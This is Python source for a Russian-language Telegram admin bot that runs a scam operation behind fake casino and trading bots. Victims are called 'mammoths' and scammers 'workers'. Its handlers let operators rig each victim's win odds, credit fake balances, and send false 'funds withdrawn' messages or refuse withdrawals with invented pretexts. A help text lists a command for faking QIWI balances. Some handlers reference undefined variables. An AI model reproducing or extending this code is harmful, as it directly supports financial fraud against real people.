@dp.message_handler(chat_type='private', content_types=['text'], text='💻 Админ-меню')
async def admin_menu(message: types.Message):
    with sqlite3.connect(BD_PATH) as cursor:
        information = cursor.execute(f'SELECT * FROM information WHERE id = 1').fetchone()
    if int(information[2]) == 0 or int(information[3]) == 0:
        medium_profits = 0
    else:
        medium_profits = (int(information[3]) / int(information[2]))
    await message.answer(f"ℹ️ Информация о проекте <b>{NAME_TEAM}</b> \n\n"
                         f"📁 Количество профитов: <b>{information[2]}</b> шт. \n"
                         f"♻️ Общая сумма профитов: <b>{information[3]} ₽</b> \n"
                         f"└  Средний профит: <b>{medium_profits} ₽</b> \n\n"
                         f"Состояние: \n"
                         f"{await functions.workStatus(WORK_STATUS)}", reply_markup=scenes.admin_menu)

@dp.callback_query_handler(text='change_qiwi')
async def change_qiwi(call: CallbackQuery):
    await call.message.answer(f"🕹 Выберите бота для смены QIWI токена.", reply_markup=scenes.changeQiwiBot)

@dp.callback_query_handler(text='change_qiwi_trading')
async def change_qiwi_trading(call: CallbackQuery):
    await call.message.answer(f"📲 Отправьте данные для смены киви в виде сообщения, (<b>номер без плюса;секретный ключ p2p qiwi;публичный ключ p2p qiwi</b>) пример: \n\n"
                              f"79645219503;eyJ2ZXJzaW9uIjoiUDJQIiwiZGF0YSI6eyJwYXlpbl9tZXJjaGFudF9zaXRlX3VpZCI6Ijd1NjJjcS0=;48e7qUxn9T1ryYe1MvZSwx1frsbe6iycj2gcrwWg4dGG1crasNTx1gbpiMsyXQFNKQhvukniQG8RTVhYm3iP6fEKBt", reply_markup=scenes.cancel)
    await changeQiwi.ChangeQiwiTrading.set()

@dp.message_handler(state=changeQiwi.ChangeQiwiTrading)
async def ChangeQiwiTrading(message: types.Message, state: FSMContext):
    await state.update_data(qiwi=message.text)
    data = await state.get_data()
    qiwi = data.get('qiwi')
    if qiwi.count(';') == 2:
        with sqlite3.connect(BD_PATH) as cursor:
            cursor.execute('UPDATE qiwi SET phone = ?, p2p_secret_key = ?, api_token = ? WHERE bot = "trading"',(qiwi.split(';')[0], qiwi.split(';')[1], qiwi.split(';')[2],))
        await message.answer(f"✅ <b>Киви апи данные для TRADING бота были обновлены!</b>")
        await state.finish()
    else:
        await message.answer(f"🚫 <b>Неверно введены данные киви, напишите данные ещё раз, пример</b>: \n\n"
                             f"79645219503;eyJ2ZXJzaW9uIjoiUDJQIiwiZGF0YSI6eyJwYXlpbl9tZXJjaGFudF9zaXRlX3VpZCI6Ijd1NjJjcS0=;48e7qUxn9T1ryYe1MvZSwx1frsbe6iycj2gcrwWg4dGG1crasNTx1gbpiMsyXQFNKQhvukniQG8RTVhYm3iP6fEKBt", reply_markup=scenes.cancel)

@dp.callback_query_handler(text='change_qiwi_casino')
async def change_qiwi_trading(call: CallbackQuery):
    await call.message.answer(f"📲 Отправьте данные для смены киви в виде сообщения, (<b>номер без плюса;секретный ключ p2p qiwi;публичный ключ p2p qiwi</b>) пример: \n\n"
                              f"79645219503;eyJ2ZXJzaW9uIjoiUDJQIiwiZGF0YSI6eyJwYXlpbl9tZXJjaGFudF9zaXRlX3VpZCI6Ijd1NjJjcS0=;48e7qUxn9T1ryYe1MvZSwx1frsbe6iycj2gcrwWg4dGG1crasNTx1gbpiMsyXQFNKQhvukniQG8RTVhYm3iP6fEKBt", reply_markup=scenes.cancel)
    await changeQiwi.ChangeQiwiCasino.set()

@dp.message_handler(state=changeQiwi.ChangeQiwiCasino)
async def ChangeQiwiTrading(message: types.Message, state: FSMContext):
    await state.update_data(qiwi=message.text)
    data = await state.get_data()
    qiwi = data.get('qiwi')
    if qiwi.count(';') == 2:
        with sqlite3.connect(BD_PATH) as cursor:
            cursor.execute('UPDATE qiwi SET phone = ?, p2p_secret_key = ?, api_token = ? WHERE bot = "casino"',(qiwi.split(';')[0], qiwi.split(';')[1], qiwi.split(';')[2],))
        await message.answer(f"✅ <b>Киви апи данные для TRADING бота были обновлены!</b>")
        await state.finish()
    else:
        await message.answer(f"🚫 <b>Неверно введены данные киви, напишите данные ещё раз, пример</b>: \n\n"
                             f"79645219503;eyJ2ZXJzaW9uIjoiUDJQIiwiZGF0YSI6eyJwYXlpbl9tZXJjaGFudF9zaXRlX3VpZCI6Ijd1NjJjcS0=;48e7qUxn9T1ryYe1MvZSwx1frsbe6iycj2gcrwWg4dGG1crasNTx1gbpiMsyXQFNKQhvukniQG8RTVhYm3iP6fEKBt", reply_markup=scenes.cancel)

@dp.callback_query_handler(text='newsletter')
async def Newsletter(call: CallbackQuery):
    await call.message.answer(f"📨 <b>Отправьте сообщение для рассылки</b>:", reply_markup=scenes.cancel)
    await newsletter.message_newsletter.set()

@dp.message_handler(state=newsletter.message_newsletter)
async def messageFrom_newsletter(message: types.Message, state: FSMContext):
    await state.update_data(message_newsletter=message.text)
    data = await state.get_data()
    message_newsletter = data.get('message_newsletter')
    with sqlite3.connect(BD_PATH) as cursor:
        workers = cursor.execute("SELECT * FROM worker").fetchall()
        count_workers = cursor.execute("SELECT COUNT(id) FROM worker",).fetchone()
    await message.answer(f"✅ <b>Рассылка была запущенна..!</b>\n\n"
                         f"📋 Воркеров: <b>{count_workers[0]}</b>")
    await state.finish()
    for id in workers:
        try:
            await bot.send_message(id[0], message_newsletter)
        except:
            print(f"{NAME_TEAM} | Worker: {id[0]} - {message_newsletter} - не удалось отправить рассылку")

@dp.callback_query_handler(text_startswith="withdraw_balance") 
async def check_pay(call:types.CallbackQuery):
    id,type = call.data.split(",")[1],call.data.split(",")[2]
    if type == 'casino':
        casino_bot = Bot(TOKEN_CASINO, parse_mode=types.ParseMode.HTML, disable_web_page_preview=True)
        await casino_bot.send_message(id, '💰Средства были выведены💰')
        await bot.delete_message(chat_id=call.from_user.id, message_id=call.message.message_id)
        await bot.send_message(call.from_user.id, f"Вы вывели баланс мамонта.")
    elif type == 'trading':
        trading_bot = Bot(TOKEN_TRADING, parse_mode=types.ParseMode.HTML, disable_web_page_preview=True)
        await trading_bot.send_message(id, '💰Средства были выведены💰')
        await bot.delete_message(chat_id=call.from_user.id, message_id=call.message.message_id)
        await bot.send_message(call.from_user.id, f"Вы вывели баланс мамонта.")

@dp.callback_query_handler(text_startswith="no_withdraw_balance") 
async def check_pay(call:types.CallbackQuery):
    id,balance,type = call.data.split(",")[1],call.data.split(",")[2],call.data.split(",")[3]
    if type == 'casino':
        with sqlite3.connect(BD_PATH) as cursor:
            cursor.execute("UPDATE users_casino SET balance = balance + ? WHERE id = ?", (bal,id,)) 
        casino_bot = Bot(TOKEN_CASINO, parse_mode=types.ParseMode.HTML, disable_web_page_preview=True)
        await bot.delete_message(chat_id=call.from_user.id, message_id=call.message.message_id)
        await casinobot.send_message(id, '🚫Вам было отказано в выводе средств, по одной из указанных причин:\n👮‍♂ Вы пытаетесь вывести на реквизиты с которых НЕ пополняли👮‍♂ Обратитесь в техническую поддержку') 
        await bot.send_message(call.from_user.id,f'Вы отменили вывод мамонта {id}')
    elif type == 'trading':
        with sqlite3.connect(BD_PATH) as cursor:
            cursor.execute("UPDATE users_trading SET balance = balance + ? WHERE id = ?", (balance, id,)) 
        await bot.delete_message(chat_id=call.from_user.id, message_id=call.message.message_id)
        trading_bot = Bot(TOKEN_TRADING, parse_mode=types.ParseMode.HTML, disable_web_page_preview=True)
        await trading_bot.send_message(id, f"🚫Вам было отказано в выводе средств") 
        await bot.send_message(call.from_user.id, f"Вы отменили вывод мамонта")

async def answer_with_menu(call: types.CallbackQuery, state: FSMContext, menu_page_shift: int):

    async with state.proxy() as data:
        with sqlite3.connect(BD_PATH) as cursor:
            worker = cursor.execute("SELECT * FROM worker WHERE id = ?", (call.from_user.id,)).fetchone()
            if data['bot'] == 'trading':
                res = cursor.execute("SELECT * FROM users_trading WHERE worker = ?", (worker[6],)).fetchall()
            else:
                res = cursor.execute("SELECT * FROM users_casino WHERE worker = ?", (worker[6],)).fetchall()
        current_page_index = data['user']
        new_page_index = current_page_index + menu_page_shift
        if (new_page_index < 0 or new_page_index > len(res)/PAGE_SIZE):
            new_page_index = current_page_index
        data['user'] = new_page_index

    the_keyboard = InlineKeyboardMarkup()
    index = new_page_index * PAGE_SIZE
    for text in res[index:index + PAGE_SIZE]:
        button = InlineKeyboardButton(text=f"{text[3]} / {text[0]}", callback_data=f"{data['bot']}_the_step,{text[0]}")
        the_keyboard.add(button)
    next = InlineKeyboardButton(text='Назад', callback_data='back_step')
    back = InlineKeyboardButton(text='Далее', callback_data='next_step')
    stop = InlineKeyboardButton(text='Закончить просмотр', callback_data='stop')
    the_keyboard.row(next, back).add(stop)

    await call.message.answer('Меню', reply_markup=the_keyboard)


@dp.callback_query_handler(text='list_users_trading')
async def enter_mamonts(call: types.CallbackQuery, state: FSMContext):
    await Menu.step.set()
    async with state.proxy() as data:
        data['user'] = 0
        data['bot'] = 'trading'
    await answer_with_menu(call, state, 0)

@dp.callback_query_handler(text='list_users_casino')
async def enter_mamonts(call: types.CallbackQuery, state: FSMContext):
    await Menu.step.set()
    async with state.proxy() as data:
        data['user'] = 0
        data['bot'] = 'casino'
    await answer_with_menu(call, state, 0)

@dp.callback_query_handler(text='next_step', state=Menu.step)
async def next_menu(call: types.CallbackQuery, state: FSMContext):
    await call.message.delete()
    await answer_with_menu(call, state, +1)


@dp.callback_query_handler(text='back_step', state=Menu.step)
async def back_menu(call: types.CallbackQuery, state: FSMContext):
    await call.message.delete()
    await answer_with_menu(call, state, -1)


@dp.callback_query_handler(text='stop', state=Menu.step)
async def newk_sui3(call: types.CallbackQuery, state: FSMContext):
    await call.message.delete()
    await call.message.answer('Подбор закончен')
    await state.finish()

@dp.callback_query_handler(text_startswith="trading_the_step", state=Menu.step)
async def the_step(call: types.CallbackQuery, state: FSMContext):
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute("SELECT * FROM users_trading WHERE id = ?", (call.data.split(',')[1],)).fetchone()
        worker = cursor.execute("SELECT * FROM worker WHERE referal_code = ?", (user[1],)).fetchone()

    change_mamont = InlineKeyboardMarkup(
        inline_keyboard = [
            [
                InlineKeyboardButton(text="💳 Изменить баланс", callback_data=f"change_balance,{user[0]},trading"),
                InlineKeyboardButton(text="🎲 Вероятность выйгрыша", callback_data=f"change_lucky_btn,{user[0]},trading") #,{user[0]},{user[4]},trading,{call.message.message_id}
            ],
            [
                InlineKeyboardButton(text="❌ Отвязать мамонта", callback_data=f"cancel_mamont,{user[0]},trading")
            ]
        ]
    )

    if user[4] == 2:
        status = "✅ФУЛЛ ВИН"
    elif user[4] == 1:
        status = "🌐50 / 50"
    elif user[4] == 0:
        status = "❌ФУЛЛ ЛУЗ"

    await call.message.answer(f"<b>🦣 Мамонт:</b> <a href='tg://user?id={user[0]}'>{user[3]}</a> \n"
                              f"<b>☠️ Воркер:</b> {worker[1]} \n\n"
                              f"<b>- TG_ID:</b> {user[0]} \n\n"
                              f"<b>- Баланс:</b> {user[2]} ₽\n"
                              f"<b>- Статус:</b> {status}", reply_markup=change_mamont)

    await state.finish()

@dp.callback_query_handler(text_startswith="casino_the_step", state=Menu.step)
async def the_step(call: types.CallbackQuery, state: FSMContext):
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute("SELECT * FROM users_casino WHERE id = ?", (call.data.split(',')[1],)).fetchone()
        worker = cursor.execute("SELECT * FROM worker WHERE referal_code = ?", (user[1],)).fetchone()

    change_mamont = InlineKeyboardMarkup(
        inline_keyboard = [
            [
                InlineKeyboardButton(text="💳 Изменить баланс", callback_data=f"change_balance,{user[0]},casino"),
                InlineKeyboardButton(text="🎲 Вероятность выйгрыша", callback_data=f"change_lucky_btn,{user[0]},casino") #,{user[0]},{user[4]},trading,{call.message.message_id}
            ],
            [
                InlineKeyboardButton(text="❌ Отвязать мамонта", callback_data=f"cancel_mamont,{user[0]},casino")
            ]
        ]
    )

    if user[4] == 2:
        status = "✅ФУЛЛ ВИН"
    elif user[4] == 1:
        status = "🌐50 / 50"
    elif user[4] == 0:
        status = "❌ФУЛЛ ЛУЗ"

    await call.message.answer(f"<b>🦣 Мамонт:</b> <a href='tg://user?id={user[0]}'>{user[3]}</a> \n"
                              f"<b>☠️ Воркер:</b> {worker[1]} \n\n"
                              f"<b>- TG_ID:</b> {user[0]} \n\n"
                              f"<b>- Баланс:</b> {user[2]} ₽\n"
                              f"<b>- Статус:</b> {status}", reply_markup=change_mamont)

    await state.finish()

@dp.callback_query_handler(text_startswith="change_lucky_btn")
async def change_lucky(call: types.CallbackQuery, state: FSMContext):
    user_id,bot = call.data.split(',')[1],call.data.split(',')[2]
    lucky = InlineKeyboardMarkup(
        inline_keyboard = [
            [
                InlineKeyboardButton(text="✅ФУЛЛ ВИН", callback_data=f"change_lucky,{user_id},2,{bot}"),
                InlineKeyboardButton(text="❌ФУЛЛ ЛУЗ", callback_data=f"change_lucky,{user_id},0,{bot}"),
                InlineKeyboardButton(text="🌐50 / 50", callback_data=f"change_lucky,{user_id},1,{bot}")
            ]
        ]
    )
    await call.message.answer(f"Выберите удачу!", reply_markup=lucky)

@dp.callback_query_handler(text_startswith="change_lucky")
async def change_lucky(call: types.CallbackQuery, state: FSMContext):
    await state.update_data(id_change=call.data.split(',')[1], lucky=call.data.split(',')[2], bot=call.data.split(',')[3])
    data = await state.get_data()

    id_change = data.get('id_change')
    lucky = data.get('lucky')
    bot = data.get('bot')

    if bot == 'trading':
        if int(lucky) == 0:
            with sqlite3.connect(BD_PATH) as cursor:
                cursor.execute("UPDATE users_trading SET lucky = ? WHERE id = ?", (0, id_change,))
        elif int(lucky) == 1:
            with sqlite3.connect(BD_PATH) as cursor:
                cursor.execute("UPDATE users_trading SET lucky = ? WHERE id = ?", (1, id_change,))
        elif int(lucky) == 2:
            with sqlite3.connect(BD_PATH) as cursor:
                cursor.execute("UPDATE users_trading SET lucky = ? WHERE id = ?", (2, id_change,))
        with sqlite3.connect(BD_PATH) as cursor:
            user = cursor.execute("SELECT * FROM users_trading WHERE id = ?", (id_change,)).fetchone()
            worker = cursor.execute("SELECT * FROM worker WHERE referal_code = ?", (user[1],)).fetchone()

        if user[4] == 2:
            status = "✅ФУЛЛ ВИН"
        elif user[4] == 1:
            status = "🌐50 / 50"
        elif user[4] == 0:
            status = "❌ФУЛЛ ЛУЗ"

        change_mamont = InlineKeyboardMarkup(
            inline_keyboard = [
                [
                    InlineKeyboardButton(text="💳 Изменить баланс", callback_data=f"change_balance,{user[0]},{bot}"),
                    InlineKeyboardButton(text="🎲 Вероятность выйгрыша", callback_data=f"change_lucky_btn,{user[0]},{bot}")
                ],
                [
                    InlineKeyboardButton(text="❌ Отвязать мамонта", callback_data=f"cancel_mamont,{user[0]},{bot}")
                ]
            ]
        )

        await call.message.answer(f"<b>🦣 Мамонт:</b> <a href='tg://user?id={user[0]}'>{user[3]}</a> \n"
                                  f"<b>☠️ Воркер:</b> {worker[1]} \n\n"
                                  f"<b>- TG_ID:</b> {user[0]} \n\n"
                                  f"<b>- Баланс:</b> {user[2]} ₽\n"
                                  f"<b>- Статус:</b> {status}", reply_markup=change_mamont)
    elif bot == 'casino':
        if int(lucky) == 0:
            with sqlite3.connect(BD_PATH) as cursor:
                cursor.execute("UPDATE users_casino SET lucky = ? WHERE id = ?", (0, id_change,))
        elif int(lucky) == 1:
            with sqlite3.connect(BD_PATH) as cursor:
                cursor.execute("UPDATE users_casino SET lucky = ? WHERE id = ?", (1, id_change,))
        elif int(lucky) == 2:
            with sqlite3.connect(BD_PATH) as cursor:
                cursor.execute("UPDATE users_casino SET lucky = ? WHERE id = ?", (2, id_change,))
        with sqlite3.connect(BD_PATH) as cursor:
            user = cursor.execute("SELECT * FROM users_casino WHERE id = ?", (id_change,)).fetchone()
            worker = cursor.execute("SELECT * FROM worker WHERE referal_code = ?", (user[1],)).fetchone()

        if user[4] == 2:
            status = "✅ФУЛЛ ВИН"
        elif user[4] == 1:
            status = "🌐50 / 50"
        elif user[4] == 0:
            status = "❌ФУЛЛ ЛУЗ"

        change_mamont = InlineKeyboardMarkup(
            inline_keyboard = [
                [
                    InlineKeyboardButton(text="💳 Изменить баланс", callback_data=f"change_balance,{user[0]},{bot}"),
                    InlineKeyboardButton(text="🎲 Вероятность выйгрыша", callback_data=f"change_lucky_btn,{user[0]},{bot}")
                ],
                [
                    InlineKeyboardButton(text="❌ Отвязать мамонта", callback_data=f"cancel_mamont,{user[0]},{bot}")
                ]
            ]
        )

        await call.message.answer(f"<b>🦣 Мамонт:</b> <a href='tg://user?id={user[0]}'>{user[3]}</a> \n"
                                  f"<b>☠️ Воркер:</b> {worker[1]} \n\n"
                                  f"<b>- TG_ID:</b> {user[0]} \n\n"
                                  f"<b>- Баланс:</b> {user[2]} ₽\n"
                                  f"<b>- Статус:</b> {status}", reply_markup=change_mamont)

@dp.callback_query_handler(text_startswith="change_balance")
async def change_balance(call: types.CallbackQuery, state: FSMContext):
    await state.update_data(id_change=call.data.split(',')[1], bot=call.data.split(',')[2])
    await call.message.answer(f"Сколько добавить на баланс?")
    await mamont_action.changeBalance.set()

@dp.message_handler(state=mamont_action.changeBalance)
async def changeBalanceMamont(message: types.Message, state: FSMContext):
    await state.update_data(amount=message.text)
    data = await state.get_data()

    amount = data.get('amount')
    id_change = data.get('id_change')
    bot = data.get('bot')

    if amount.isnumeric():
        if bot == 'trading':
            with sqlite3.connect(BD_PATH) as cursor:
                cursor.execute('UPDATE users_trading SET balance = balance + ? WHERE id = ?',(amount, id_change,))
                user = cursor.execute("SELECT * FROM users_trading WHERE id = ?", (id_change,)).fetchone()
                worker = cursor.execute("SELECT * FROM worker WHERE referal_code = ?", (user[1],)).fetchone()
            trading_bot = Bot(TOKEN_TRADING, parse_mode=types.ParseMode.HTML, disable_web_page_preview=True)
            await trading_bot.send_message(id_change, f"Ваш баланс обновлен!") 

            change_mamont = InlineKeyboardMarkup(
                inline_keyboard = [
                    [
                        InlineKeyboardButton(text="💳 Изменить баланс", callback_data=f"change_balance,{user[0]},{bot}"),
                        InlineKeyboardButton(text="🎲 Вероятность выйгрыша", callback_data=f"change_lucky_btn,{user[0]},{bot}")
                    ],
                    [
                        InlineKeyboardButton(text="❌ Отвязать мамонта", callback_data=f"cancel_mamont,{user[0]},{bot}")
                    ]
                ]
            )

            if user[4] == 2:
                status = "✅ФУЛЛ ВИН"
            elif user[4] == 1:
                status = "🌐50 / 50"
            elif user[4] == 0:
                status = "❌ФУЛЛ ЛУЗ"

            await message.answer(f"Баланс был обновлён!")
            await message.answer(f"<b>🦣 Мамонт:</b> <a href='tg://user?id={user[0]}'>{user[3]}</a> \n"
                                      f"<b>☠️ Воркер:</b> {worker[1]} \n\n"
                                      f"<b>- TG_ID:</b> {user[0]} \n\n"
                                      f"<b>- Баланс:</b> {user[2]} ₽\n"
                                      f"<b>- Статус:</b> {status}", reply_markup=change_mamont)
        elif bot == 'casino':
            with sqlite3.connect(BD_PATH) as cursor:
                cursor.execute('UPDATE users_casino SET balance = balance + ? WHERE id = ?',(amount, id_change,))
                user = cursor.execute("SELECT * FROM users_casino WHERE id = ?", (id_change,)).fetchone()
                worker = cursor.execute("SELECT * FROM worker WHERE referal_code = ?", (user[1],)).fetchone()
            casino_bot = Bot(TOKEN_CASINO, parse_mode=types.ParseMode.HTML, disable_web_page_preview=True)
            await casino_bot.send_message(id_change, f"Ваш баланс обновлен!") 

            change_mamont = InlineKeyboardMarkup(
                inline_keyboard = [
                    [
                        InlineKeyboardButton(text="💳 Изменить баланс", callback_data=f"change_balance,{user[0]},{bot}"),
                        InlineKeyboardButton(text="🎲 Вероятность выйгрыша", callback_data=f"change_lucky_btn,{user[0]},{bot}")
                    ],
                    [
                        InlineKeyboardButton(text="❌ Отвязать мамонта", callback_data=f"cancel_mamont,{user[0]},{bot}")
                    ]
                ]
            )

            if user[4] == 2:
                status = "✅ФУЛЛ ВИН"
            elif user[4] == 1:
                status = "🌐50 / 50"
            elif user[4] == 0:
                status = "❌ФУЛЛ ЛУЗ"

            await message.answer(f"Баланс был обновлён!")
            await message.answer(f"<b>🦣 Мамонт:</b> <a href='tg://user?id={user[0]}'>{user[3]}</a> \n"
                                      f"<b>☠️ Воркер:</b> {worker[1]} \n\n"
                                      f"<b>- TG_ID:</b> {user[0]} \n\n"
                                      f"<b>- Баланс:</b> {user[2]} ₽\n"
                                      f"<b>- Статус:</b> {status}", reply_markup=change_mamont)

        await state.finish()
    else:
        await message.answer(f"Введено не число!")

@dp.callback_query_handler(text_startswith="cancel_mamont")
async def change_lucky(call: types.CallbackQuery, state: FSMContext):
    await state.update_data(id_change=call.data.split(',')[1], bot=call.data.split(',')[2])
    data = await state.get_data()

    id_change = data.get('id_change')
    bot = data.get('bot')

    if bot == 'trading':
        with sqlite3.connect(BD_PATH) as cursor:
            cursor.execute('UPDATE users_trading SET ban = ?, worker = ? WHERE id = ?',(1, 0, id_change,))
            user = cursor.execute("SELECT * FROM users_trading WHERE id = ?", (id_change,)).fetchone()
            worker = cursor.execute("SELECT * FROM worker WHERE referal_code = ?", (user[1],)).fetchone()
        change_mamont = InlineKeyboardMarkup(
            inline_keyboard = [
                [
                    InlineKeyboardButton(text="💳 Изменить баланс", callback_data=f"change_balance,{user[0]},{bot}"),
                    InlineKeyboardButton(text="🎲 Вероятность выйгрыша", callback_data=f"change_lucky_btn,{user[0]},{bot}")
                ],
                [
                    InlineKeyboardButton(text="❌ Отвязать мамонта", callback_data=f"cancel_mamont,{user[0]},{bot}")
                ]
            ]
        )

        if user[4] == 2:
            status = "✅ФУЛЛ ВИН"
        elif user[4] == 1:
            status = "🌐50 / 50"
        elif user[4] == 0:
            status = "❌ФУЛЛ ЛУЗ"

        await call.message.answer(f"<b>🦣 Мамонт:</b> <a href='tg://user?id={user[0]}'>{user[3]}</a> \n"
                                  f"<b>☠️ Воркер:</b> {worker[1]} \n\n"
                                  f"<b>- TG_ID:</b> {user[0]} \n\n"
                                  f"<b>- Баланс:</b> {user[2]} ₽\n"
                                  f"<b>- Статус:</b> {status}", reply_markup=change_mamont)
    if bot == 'casino':
        with sqlite3.connect(BD_PATH) as cursor:
            cursor.execute('UPDATE users_casino SET ban = ?, worker = ? WHERE id = ?',(1, 0, id_change,))
            user = cursor.execute("SELECT * FROM users_casino WHERE id = ?", (id_change,)).fetchone()
            worker = cursor.execute("SELECT * FROM worker WHERE referal_code = ?", (user[1],)).fetchone()
        change_mamont = InlineKeyboardMarkup(
            inline_keyboard = [
                [
                    InlineKeyboardButton(text="💳 Изменить баланс", callback_data=f"change_balance,{user[0]},{bot}"),
                    InlineKeyboardButton(text="🎲 Вероятность выйгрыша", callback_data=f"change_lucky_btn,{user[0]},{bot}")
                ],
                [
                    InlineKeyboardButton(text="❌ Отвязать мамонта", callback_data=f"cancel_mamont,{user[0]},{bot}")
                ]
            ]
        )

        if user[4] == 2:
            status = "✅ФУЛЛ ВИН"
        elif user[4] == 1:
            status = "🌐50 / 50"
        elif user[4] == 0:
            status = "❌ФУЛЛ ЛУЗ"

        await call.message.answer(f"<b>🦣 Мамонт:</b> <a href='tg://user?id={user[0]}'>{user[3]}</a> \n"
                                  f"<b>☠️ Воркер:</b> {worker[1]} \n\n"
                                  f"<b>- TG_ID:</b> {user[0]} \n\n"
                                  f"<b>- Баланс:</b> {user[2]} ₽\n"
                                  f"<b>- Статус:</b> {status}", reply_markup=change_mamont)

@dp.message_handler(chat_type=['supergroup', 'group'], commands="help")
async def help(message: types.Message):
    await message.answer(f"Список команд: \n\n"
                        f"/top - топ за все время \n"
                        f"/topm - топ за месяц \n"
                        f"/topd - топ за день \n\n" 
                        f"/rangs - Ранги {NAME_TEAM} \n"
                        f"/me - Инфо о себе \n"
                        f"/work - Состояние проекта \n"
                        f"/fake - любой Баланс QIWI (прописывать так /fake время сумма) \n"
                        f"/mute - Команда для Админов \n"
                        f"/unmute - Команда для Админов")

@dp.callback_query_handler(text_startswith="casino_accept")
async def casino_accept(call: types.CallbackQuery):
    comment,id,amount = call.data.split(",")[1],call.data.split(",")[2],call.data.split(",")[3]
    with sqlite3.connect(BD_PATH) as cursor:
        cursor.execute("UPDATE qiwi_pays SET status = 1 WHERE comment = ?", (comment,))
        cursor.execute("UPDATE users_casino SET balance = balance + ? WHERE id = ?", (amount, id,))
    await bot.delete_message(chat_id=call.from_user.id, message_id=call.message.message_id)
    await call.message.answer("Вы подтвердили пополнение")

@dp.callback_query_handler(text_startswith="trading_accept")
async def trading_accept(call: types.CallbackQuery):
    comment,id,amount = call.data.split(",")[1],call.data.split(",")[2],call.data.split(",")[3]
    with sqlite3.connect(BD_PATH) as cursor:
        cursor.execute("UPDATE qiwi_pays SET status = 1 WHERE comment = ?", (comment,))
        cursor.execute("UPDATE users_trading SET balance = balance + ? WHERE id = ?", (amount, id,))
    await bot.delete_message(chat_id=call.from_user.id, message_id=call.message.message_id)
    await call.message.answer("Вы подтвердили пополнение")

# @dp.callback_query_handler(text_startswith="check_PayQiwi") 
# async def check_pay(call:types.CallbackQuery):
#     id,price,bot,comment = call.data.split(",")[1], call.data.split(",")[2], call.data.split(",")[3],call.data.split(",")[4]
#     with sqlite3.connect(bd) as c:
#         c.execute(f"UPDATE pays SET status = '1' WHERE comment = {comment}")
#     await call.message.edit_text('Готово')
#     if bot == 'trading':
#         with sqlite3.connect(bd) as c:
#             c.execute("UPDATE users_trading SET balance = balance + ? WHERE id = ?", (price,id,))
#         await call.message.edit_text('Готово')

@dp.callback_query_handler(text="cancel", state="*")
async def cancel_btn(call: types.CallbackQuery, state: FSMContext):
    await state.finish()
    await bot.delete_message(chat_id=call.from_user.id, message_id=call.message.message_id)
    await call.message.answer("Отмена", reply_markup=scenes.main_admin)

# start bot
if __name__ == '__main__':
    executor.start_polling(dp)
